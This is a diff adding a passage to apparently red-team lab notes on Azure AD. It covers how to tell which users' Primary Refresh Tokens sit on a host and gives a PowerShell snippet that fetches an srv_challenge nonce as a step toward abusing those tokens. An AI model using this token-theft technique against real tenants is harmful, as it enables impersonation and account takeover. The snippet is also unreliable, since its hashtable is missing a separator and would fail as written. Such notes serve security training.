@@ -1256,3 +1256,13 @@ Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\student
 How do we know which user's PRT is available?
 - basic enumeration using a tool like seatbelt (also checkout LSA Whisperer?)
 - run `qwinsta` or `get-process` - users will be listed as `AzureAD\User`
+- 
+#### Get nonce
+```
+$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
+$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+$Params = @{ "URI" = $URL "Method" = "POST" }
+$Body = @{ "grant_type" = "srv_challenge" }
+$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+$Result.Nonce
+```
